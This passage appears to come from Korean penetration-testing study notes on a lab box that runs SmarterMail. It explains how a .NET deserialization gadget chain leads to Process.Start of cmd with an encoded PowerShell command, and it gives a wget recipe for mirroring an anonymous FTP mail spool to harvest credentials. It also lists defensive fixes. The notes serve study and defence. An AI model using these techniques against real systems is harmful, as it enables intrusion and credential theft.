| 2 | 삽입하려면 비교자를 호출해야 함. 비교자는 스트림이 정한 `ComparisonComparer<string>` — `Comparison<string>` 델리게이트를 감싼 래퍼 |
| 3 | 그 델리게이트는 `DelegateSerializationHolder` 로 복원됨 |
| 4 | `DelegateSerializationHolder` 는 「델리게이트 타입 + 대상 메서드」를 받아 리플렉션으로 델리게이트를 재구성함. 여기서 시그니처 검증이 느슨함 |
| 5 | 스트림은 델리게이트 타입을 `Comparison<string>`(= `int (string, string)`)이라 선언해 놓고 실제 바인딩 메서드로는 `Process.Start(string, string)` 를 지정 |
| 6 | 둘은 반환형이 다름(`int` vs `Process`). 그런데 x64 에서 둘 다 레지스터 하나로 반환되므로 호출 규약이 호환됨 → **타입 혼동(type confusion)** |
| 7 | 1단계의 트리 삽입이 비교자를 호출 → 실제로는 `Process.Start("cmd", "/c powershell.exe -encodedCommand ...")` 가 실행됨 |

**`DelegateSerializationHolder` 가 하는 일** — 델리게이트(함수 포인터)는 메모리 주소라 그대로 직렬화될 수 없음. 그래서 .NET 은 「어느 타입의 어느 메서드인가」라는 메타데이터로 바꿔 담고 복원할 때 리플렉션으로 다시 묶음. 즉 **「문자열로 적힌 메서드 이름을 실제 호출 가능한 함수로 바꿔주는 공장」**이고, 공격자가 그 문자열을 정하면 `mscorlib`/`System` 안의 아무 정적 메서드나 호출할 수 있게 됨. `MemberInfoSerializationHolder` 는 그 하위 부품으로 `System.Diagnostics.Process Start(System.String, System.String)` 라는 **시그니처 문자열로 메서드를 찾아줌** — 페이로드에 이 문자열이 두 번(`Signature`·`Signature2`) 들어 있는 이유임.

**인자 순서** — 디코드한 페이로드의 배열 원소 두 개:
```text
ArraySingleObject id=4, length=2
  ├─ [0] BinaryObjectString id=6 : "/c powershell.exe -encodedCommand XXXX...(1360)"
  └─ [1] BinaryObjectString id=7 : "cmd"
```
원소 두 개짜리 트리를 재구성할 때 먼저 들어간 것이 루트가 되고 두 번째 삽입에서 `Compare(신규, 기존)` 이 호출됨 `[가정]`. 그러면 `Process.Start("cmd", "/c powershell.exe ...")` 가 되어 파일명이 `cmd`, 인자가 `/c ...` 로 올바르게 맞음. **실제로 셸이 떨어졌으므로 결과는 확정이나, 위 호출 순서 설명 자체는 코드 계측으로 확인하지 않았으므로 `[가정]` 으로 둠.**

**역직렬화 취약점을 만났을 때 확인할 것 넷**
1. **어떤 직렬화기인가** — `BinaryFormatter`·`ObjectStateFormatter`·`LosFormatter`·`NetDataContractSerializer` 면 즉시 RCE 후보
2. **가젯이 실행되는 트리거** — `OnDeserialization`·`ISerializable` 생성자·`IDeserializationCallback`, 자바면 `readObject`/`readResolve`
3. **전달 경로** — 쿠키·ViewState·HTTP 본문, 그리고 원시 TCP(.NET Remoting)
4. **자바 등가물** — `CommonsCollections1~7`·`Spring1`·`Jdk7u21`. `ysoserial`(자바)/`ysoserial.net`(닷넷)은 개념이 같고 이름만 다름

**출처** — [[Algernon]](`TypeConfuseDelegate`, CVE-2019-7214).

**지우기 전 원문** — 노트 §2-1 · §2-2 · §2-5 전량. 위 본문이 그 셋을 그대로 옮긴 것이며 `[가정]` 표시 2건을 유지했음.

---

## 20. **신규 후보 (기록자 판단)** — 「이 박스에서 배우는 것」 중 남는 조각

아래는 위 19건에 흡수되지 않은 나머지임. **전부 기존 항목에 붙일 수 있어 신규를 만들지 않아도 됨**(역검색 결과).

| 조각 | 제안 |
|---|---|
| 「익스플로잇 제목의 버전은 타겟 버전이 아님」 | 위 **2번(A-13)** 에 흡수 |
| 「서비스 실행 계정이 곧 권한상승 유무를 결정」 | 위 **13번(B-44)** 에 흡수 |
| 「Metasploit 카드를 아끼는 판단」 | 위 **17번(E)** 에 흡수 |
| 「성공 신호가 없는 익스플로잇을 다루는 법」 | 위 **1번(A-12)** 에 흡수 |
| 「.NET Remoting 이라는 잊힌 공격면」 | 위 **18번(신규 B-2)** 에 흡수 |
| 「.NET 역직렬화가 왜 RCE 가 되는가」 | 위 **19번(신규)** 에 흡수 |
| 「버전은 독립 근거 2개 이상」 | 이미 A-13 에 있음 — [[Algernon]] 을 누적 사례 목록에 **이름만** 추가 |

**지우기 전 원문 (노트 §0 · 「시험 출제 가능성」 표 · 「이 박스가 값진 이유」)**

> ## 0. 이 박스에서 배우는 것
> - **.NET 역직렬화가 왜 RCE가 되는가** — `BinaryFormatter`, 가젯 체인, `DelegateSerializationHolder`가 실제로 무슨 일을 하는지. 페이로드를 base64로 복붙하는 수준을 벗어남
> - **.NET Remoting(17001/tcp)이라는 잊힌 공격면** — 웹 포트가 아니라 바이너리 RPC 포트가 진짜 입구
> - **"버전은 독립 근거 2개 이상"** — 브리핑에 적힌 빌드 번호가 틀림. 런타임 렌더·정적 자산 경로·디스크 바이너리 3중으로 뒤집음
> - **익스플로잇 제목의 버전은 타겟 버전이 아님** — `SmarterMail Build 6985 - RCE`의 6985는 취약 상한선이지 이 박스의 빌드가 아님
> - **서비스 실행 계정이 곧 권한상승 유무를 결정** — `Win32_Service.StartName`이 `LocalSystem`이면 4장이 통째로 사라짐
> - **Metasploit 카드를 아끼는 판단** — 동일 모듈이 존재하는데도 EDB 스크립트를 쓴 이유
> - **성공 신호가 없는 익스플로잇을 다루는 법** — 이 스크립트는 아무것도 출력하지 않고 `EXIT=0`으로 끝남. 리스너만이 진실을 말함
>
> > [!tip] 시험 출제 가능성
> > | 요소 | 시험 출제 가능성 | 이유 |
> > |---|---|---|
> > | 비표준 고번호 포트의 미확인 서비스 | 매우 높음 | 시험 박스는 `-p-` 없이는 못 푸는 구성을 즐김. 17001 같은 포트를 "unknown"이라고 넘기는 순간 끝 |
> > | 버전 → 공개 익스플로잇 → 원샷 | 매우 높음 | OSCP 시험의 표준 foothold 패턴임. 어려운 것은 익스플로잇이 아니라 정확한 버전 판정 |
> > | .NET 역직렬화 자체 | 중간 | CVE-2019-7214가 그대로 나올 가능성은 낮음. 그러나 Telerik UI 역직렬화, ViewState MAC 미검증, Java `readObject` 등 같은 클래스가 반복 출제됨 |
> > | 서비스 계정이 SYSTEM이라 권한상승 불요 | 중간 | Windows 서비스를 익스플로잇해 셸을 잡으면 흔히 생김. 셸을 잡자마자 `whoami`부터 치는 이유 |
> > 변형의 모습 — SmarterMail 대신 Telerik/Jenkins/Tomcat, 17001 대신 8080/9000, `BinaryFormatter` 대신 Java `ObjectInputStream`. **"신뢰 없는 바이트를 객체로 되돌리면 코드가 실행된다"는 원리는 동일함.**
>
> ### 이 박스가 값진 이유
> 익스플로잇 자체는 5분이면 끝남. **값은 그 앞뒤에 있음** — 브리핑에 적힌 빌드 번호가 틀렸다는 것을 어떻게 잡았는가, 서로 다른 두 포트(9998/17001) 중 무엇이 진짜 대상인가, 그리고 리스너 인프라를 잘못 만들어 첫 발사를 날렸을 때 어떻게 그것을 알아채는가.
> 6장이 이 노트의 절반인 이유임.

---

## 21. **신규** — B-2(네트워크 서비스) — `ftp-anon` 을 보면 «먼저» 통째로 받는다

**어느 절** — `B-2. 네트워크 서비스`. `_PLAYBOOK` 에 `ftp-anon`·`익명 FTP`·`anonymous` 가 **0건**이라 기존 항목 없음(역검색 확인). `B-27. 익명으로 열리는 SMB 공유` 의 FTP 판이므로 그 옆이 자연스러움. `B-29`(FTP PASV)와는 다른 증상임.

**넣을 본문**

**`ftp-anon: Anonymous FTP login allowed` 가 뜨면 판단하지 말고 재귀로 다 받을 것.** 크기가 작으면 몇 초이고, 시험장에서 「나중에 봐야지」 하고 넘긴 익명 FTP 가 **유일한 자격증명 출처**인 경우가 실제로 있음.
```bash
wget -m --no-passive-ftp ftp://anonymous:anonymous@<타겟>/
# LIST 가 멈추면 패시브 모드 문제 — B-29
```

**디렉터리 «이름»이 제품을 지목함.** [[Algernon]] — nmap 이 넷을 보여줬고 그 조합이 SmarterMail 데이터 디렉터리의 시그니처였음:
```text
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
```
— 출처: `~/PG/Algernon/nmap.log`

즉 **FTP 루트가 메일 스풀에 그대로 붙어 있음.** 노릴 것:

| 디렉터리 | 노려볼 것 |
|---|---|
| `Spool` | 평문 `.eml` 메일 본문. 자격증명·초대 링크·내부 호스트명이 메일에 적혀 있는 경우가 흔함(B-2-13) |
| `Logs` | 로그인 시도에 계정명이 남아 **사용자 열거**가 됨. 타임스탬프가 최근이면 활성 로그 |
| `ImapRetrieval` / `PopRetrieval` | 외부 메일 계정 수집 설정 — 저장된 외부 계정 자격증명 |

⚠️ **`ls -la` 의 타임스탬프를 읽을 것** — [[Algernon]] 은 셋이 `04-29-20`(설치 시점)인데 `Logs` 만 `08-19-26`(전날)이라 **살아 있는 것이 무엇인지**가 그 한 줄로 갈렸음.
⚠️ **다만 더 빠른 경로가 있으면 2순위로 둘 것.** [[Algernon]] 은 17001 경로가 압도적으로 빨라 FTP 를 손대지 않았고 그것이 옳았음 — 「무조건 받아라」는 **비용이 0 에 가까울 때**의 규칙임.

**출처** — [[Algernon]](SmarterMail 스풀, 미사용 대안 경로).

**지우기 전 원문**

> ### 1-7. 익명 FTP — 이번엔 안 썼지만 기록해 둠
> 디렉터리 4개가 전부 **SmarterMail 데이터 디렉터리**. 즉 익명 FTP가 메일 스풀에 그대로 붙어 있음.
> ```bash
> # 이번 풀이에서는 사용하지 않았다. 대안 경로로만 기록한다.
> ftp 192.168.248.65        # user: anonymous / pass: (아무거나)
> # 또는 재귀 미러링
> wget -m --no-passive-ftp ftp://anonymous:anonymous@192.168.248.65/
> ```
> **왜 대안 경로인가**
> | 디렉터리 | 노려볼 것 |
> |---|---|
> | `Spool` | 평문 `.eml` 메일 본문. 자격증명·초대 링크·내부 호스트명이 메일에 적혀 있는 경우가 흔함 |
> | `Logs` | SmarterMail 로그. 로그인 시도에 계정명이 남음 → 사용자 열거. `08-19-26` 타임스탬프로 보아 활성 로그 |
> | `ImapRetrieval` / `PopRetrieval` | 외부 메일 계정을 끌어오는 설정. 저장된 외부 계정 자격증명이 있을 수 있음 |
> > [!tip] 시험 반사 — 익명 FTP를 보면
> > `ftp-anon`이 뜨면 **무조건 재귀로 다 받아라.** 크기가 작으면 몇 초. 시험장에서 "나중에 봐야지" 하고 넘긴 익명 FTP가 유일한 자격증명 출처인 경우가 실제로 있음.
> > 다만 **이 박스에서는 17001 경로가 압도적으로 빠름.** FTP는 17001이 실패했을 때의 2순위.
>
> 13. **익명 FTP는 무조건 통째로 받아라.** 이 박스에서는 안 썼지만, `Spool`/`Logs` 안에 자격증명이 있는 구성은 흔함.

⚠️ 노트의 표와 `wget` 명령은 **남겨 두었음**(Service Enumeration 의 관측 기록이라 심사관이 「왜 안 팠는가」를 납득하는 데 필요). 이관 대상은 「무조건 받아라」는 **일반화 반사**임.
⛔ 원문 코드펜스 안의 한국어 주석 두 줄(`# 이번 풀이에서는 사용하지 않았다…`·`# user: anonymous …`)은 **펜스 밖 산문으로 뺐음** — 펜스 안에는 산출물 원문만 둠.

---

## 22. 방어 관점(§8) 나머지 — 노트의 `Vulnerability Fix:` 로 **분산 완료** (이관 아님)

원 §8 표 8행 전부가 `Initial Access` 의 `Vulnerability Fix:` 로 들어갔고 `_PLAYBOOK` 대상은 아님. 기록용으로만 남김.

| 원 §8 행 | 어디로 |
|---|---|
| 패치(빌드 6985 이상) | `Vulnerability Fix:` 1번 — msf 모듈 근거로 「17001 을 127.0.0.1 로 바인딩」까지 보강 |
| .NET Remoting 노출 차단 | 2번 |
| `BinaryFormatter` 제거 | 3번 |
| `typeFilterLevel=Low` | 2번에 병기 |
| 서비스 계정 최소권한 | 4번 |
| 익명 FTP 비활성화 | 5번 |
| 아웃바운드 이그레스 필터 | 6번 |
| 80/tcp TRACE 비활성화 | 7번 |
| 「우선순위 하나만 고른다면 — 서비스 계정 강등」 | `Vulnerability Fix:` 말미에 그대로 유지 |

---

## 반영 후 확인할 것

- **[[Algernon]] 노트에는 신규 항목 앵커를 걸지 않았음.** 18·19·21번이 반영되면 노트 `## 관련` 마지막 줄에 그 세 앵커를 추가할 것
- A-13·A-31·A-12·A-1-18 의 누적 사례 목록에 `[[Algernon]]` 이름을 넣을 것
- 18번 반영 시 **`_PLAYBOOK` 본문에 CVE-2019-18935 번호를 적지 말 것** — Telerik 은 「제품명만」으로 언급. `_PLAYBOOK.md` 는 수동 프론트매터라 색인 영향은 없으나 관례를 맞춤
